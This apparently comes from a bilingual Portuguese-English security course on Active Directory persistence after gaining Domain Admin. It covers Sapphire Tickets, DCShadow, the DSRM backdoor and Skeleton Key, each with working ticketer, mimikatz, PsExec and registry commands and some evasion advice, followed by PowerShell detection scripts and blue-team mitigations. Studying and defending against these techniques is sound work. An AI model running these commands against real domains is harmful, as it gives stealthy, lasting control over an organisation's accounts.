2. Contexto e Relevância / Context and Relevance Original

Depois de obter Domain Admin, o objetivo é manter o acesso mesmo que as credenciais sejam mudadas. As técnicas deste capítulo são particularmente perigosas porque abusam de mecanismos legítimos do AD ou de processos de confiança (replicação, LSASS) que os defensores raramente monitorizam de perto. Sapphire Tickets reutilizam PACs legítimos; DCShadow abusa da replicação; o DSRM Backdoor ativa uma conta esquecida; Skeleton Key patcheia LSASS para aceitar uma password universal. After obtaining Domain Admin, the goal is to maintain access even if credentials are changed. The techniques in this chapter are particularly dangerous because they abuse legitimate AD mechanisms or trusted processes (replication, LSASS) that defenders rarely monitor closely. Sapphire Tickets reuse legitimate PACs; DCShadow abuses replication; the DSRM Backdoor activates a forgotten account; Skeleton Key patches LSASS to accept a universal password.

3. Sapphire Tickets Original

Um Sapphire Ticket é uma das técnicas de abuso de Kerberos mais avançadas atualmente discutidas publicamente. Em vez de forjar informação PAC, o atacante extrai o PAC legítimo de um utilizador privilegiado através da funcionalidade de delegação S4U e embebe esse PAC autêntico num ticket modificado. Os tickets forjados tradicionais contêm dados PAC artificiais criados pelo hacker. Os Sapphire Tickets reutilizam dados de autorização legítimos gerados pelo domínio. Como resultado, o ticket parece muito mais autêntico durante as verificações de validação. A Sapphire Ticket is one of the most advanced Kerberos abuse techniques currently discussed publicly. Instead of forging PAC information, the attacker extracts the legitimate PAC from a privileged user through S4U delegation functionality and embeds that authentic PAC into a modified ticket. Traditional forged tickets contain artificial PAC data created by the hacker. Sapphire Tickets reuse legitimate authorization data generated by the domain. As a result, the ticket appears far more authentic during validation checks.

3.1 Execução / Execution

kali > python3 ticketer.py -request -domain domain.local -user lowpriv -password 'P@ssw0rd123' -aesKey  -domain-sid S-1-5-21-XXXXXXXX -impersonate Administrator domain.local
Os tickets são geralmente válidos por cerca de 10 horas por omissão. Embora seja tecnicamente possível estender o tempo de vida, isso não é uma boa decisão OPSEC — tickets de longa duração destacam-se em investigações. Tickets are typically valid for around 10 hours by default. While it's technically possible to extend the lifetime, doing so is not a good OPSEC decision — long-lived tickets stand out during investigations.

4. DCShadow Original

O DCShadow abusa dos mecanismos de replicação que o AD depende internamente. Normalmente, os Domain Controllers replicam alterações entre si automaticamente, e as soluções de monitorização confiam nesse tráfego. O atacante regista temporariamente uma máquina rogue como um falso Domain Controller e empurra alterações arbitrárias para o AD através de protocolos de replicação. Como as modificações parecem originar-se de atividade legítima de replicação de DC, muitos mecanismos de logging padrão falham em detetar a atividade. Requer privilégios de Domain Admin. DCShadow abuses the replication mechanisms that AD depends on internally. Normally, Domain Controllers replicate changes between each other automatically, and monitoring solutions trust this traffic. The attacker temporarily registers a rogue machine as a fake Domain Controller and pushes arbitrary changes into AD through replication protocols. Since the modifications appear to originate from legitimate DC replication activity, many standard logging mechanisms fail to detect the activity. Requires Domain Admin privileges.

4.1 Execução / Execution

# Shell 1: SYSTEM via PsExec
PS > .\PsExec.exe \\delivery -u sekvoya.local\service_adm -p P@ssw0rd123! -s powershell

# Modificar o alvo (promover a Domain Admin)
PS > .\mimikatz.exe "privilege::debug" "lsadump::dcshadow /object:CN=lowpriv,CN=Users,DC=sekvoya,DC=local /attribute:primaryGroupID /value:512" "exit"

# Shell 2: Domain Admin — empurrar alterações
PS > .\mimikatz.exe "lsadump::dcshadow /push"

5. DSRM Account Backdoor Original

Cada Domain Controller contém uma conta local de administrador do Directory Services Restore Mode (DSRM). Esta conta atua como mecanismo de recuperação de emergência. Durante a promoção do DC, os administradores definem a password DSRM uma vez e frequentemente esquecem-se dela. Por omissão, a conta DSRM não pode autenticar pela rede enquanto o domínio opera normalmente. No entanto, uma modificação no registo pode alterar esse comportamento. Every Domain Controller contains a local Directory Services Restore Mode (DSRM) administrator account. This account acts as a break-glass recovery mechanism. During DC promotion, administrators set the DSRM password once and frequently forget about it. By default, the DSRM account cannot authenticate over the network while the domain operates normally. However, a registry modification can change that behavior.

5.1 Execução / Execution

# Dump do SAM local do DC
PS > . .\Invoke-Mimikatz.ps1
PS > Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Ativar logon de rede para a conta DSRM
PS > reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

6. Skeleton Key Original

O Skeleton Key é uma técnica clássica mas ainda interessante. Em vez de modificar tickets Kerberos ou dados de replicação, patcheia a memória do LSASS diretamente no Domain Controller. Uma vez patcheado, o DC aceita uma password universal para todas as contas de domínio, continuando a aceitar as passwords normais. Skeleton Key is a classic but still interesting technique. Instead of modifying Kerberos tickets or replication data, it patches LSASS memory directly on the Domain Controller. Once patched, the DC accepts a universal master password for every domain account while still accepting normal passwords. 
# Executar Mimikatz no DC para patch de LSASS
mimikatz # privilege::debug
mimikatz # misc::skeleton
A password universal padrão é mimikatz. Qualquer utilizador de domínio pode autenticar com essa password. The default universal password is mimikatz. Any domain user can authenticate with that password.

7. Scripts de Impacto / Impact Scripts Impacto Complementar

Os scripts abaixo ajudam o blue team a detetar as técnicas deste capítulo. The scripts below help the blue team detect the techniques in this chapter.

7.1 Script 17.1 — Deteção de DSRM Backdoor / DSRM Backdoor Detection

Objetivo: detetar a alteração de DsrmAdminLogonBehavior para 2 (logon de rede ativado). Evidência: dsrm-detect.csv. Goal: detect the change of DsrmAdminLogonBehavior to 2 (network logon enabled). Evidence: dsrm-detect.csv. 
# Script 17.1 - DSRM Backdoor Detection
$out = ".\dsrm-detect.csv"
$key = "HKLM:\System\CurrentControlSet\Control\Lsa"
$val = (Get-ItemProperty $key -Name "DsrmAdminLogonBehavior" -EA SilentlyContinue).DsrmAdminLogonBehavior
$hits = @()
if ($val -eq 2) {
  $hits += [PSCustomObject]@{ Key=$key; Value=$val; Status="NETWORK LOGON ENABLED"; Severity="CRITICAL" }
} elseif ($val -eq 1) {
  $hits += [PSCustomObject]@{ Key=$key; Value=$val; Status="SERVICE ONLY"; Severity="MEDIUM" }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] DSRM findings: $($hits.Count) -> $out" -ForegroundColor Red
$hits | Format-Table -AutoSize

7.2 Script 17.2 — Deteção de DCShadow / DCShadow Detection

Objetivo: detetar registos de DC rogue via evento 4742 (computer account changed) e tráfego de replicação anómalo. Evidência: dcshadow-detect.csv. Goal: detect rogue DC registration via event 4742 (computer account changed) and anomalous replication traffic. Evidence: dcshadow-detect.csv. 
# Script 17.2 - DCShadow Detection (heuristic)
$out = ".\dcshadow-detect.csv"
$hits = @()
# Computer accounts changed recently
Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4742 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $target = ($xml.Event.EventData.Data | Where-Object Name -eq "TargetUserName").'#text'
    if ($target -match "\$$") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Computer=$target; Event="4742" }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Computer account changes: $($hits.Count) -> $out" -ForegroundColor Yellow

7.3 Script 17.3 — Deteção de Skeleton Key / Skeleton Key Detection

Objetivo: detetar logons com a password universal mimikatz (evento 4624) e patch de LSASS (Sysmon Event 10). Evidência: skeleton-detect.csv. Goal: detect logons with the universal password mimikatz (event 4624) and LSASS patch (Sysmon Event 10). Evidence: skeleton-detect.csv. 
# Script 17.3 - Skeleton Key Detection
$out = ".\skeleton-detect.csv"
$hits = @()
# Logons with mimikatz password (4624) - requires auditing
Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4624 } | ForEach-Object {
    if ($_.Message -match "mimikatz") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Event="4624"; Note="Universal password detected" }
    }
  }
# LSASS access (Sysmon 10)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 1000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 10 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $target = ($xml.Event.EventData.Data | Where-Object Name -eq "TargetImage").'#text'
    if ($target -match "lsass\.exe") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Event="Sysmon10"; Note="LSASS access" }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Skeleton Key indicators: $($hits.Count) -> $out" -ForegroundColor Red

9. Mitigações Blue Team / Mitigations Complementar

  1. Monitorizar DsrmAdminLogonBehavior — deve ser 0 ou 1, nunca 2.
  2. Monitorizar evento 4742 — criação/alteração de contas de computador (DC rogue).
  3. Monitorizar replicação AD — tráfego de replicação de fontes não autorizadas.
  4. Proteger LSASS — Credential Guard, RunAsPPL, e monitorização Sysmon 10.
  5. Auditar Kerberos — tickets com PAC legítimo mas origem suspeita (Sapphire).
  6. Restringir Domain Admin — Tier 0, Protected Users, gMSA.
  7. Monitorizar password universal — alertar sobre logons com "mimikatz".
  8. Honeytokens — conta DSRM falsa, DC falso.
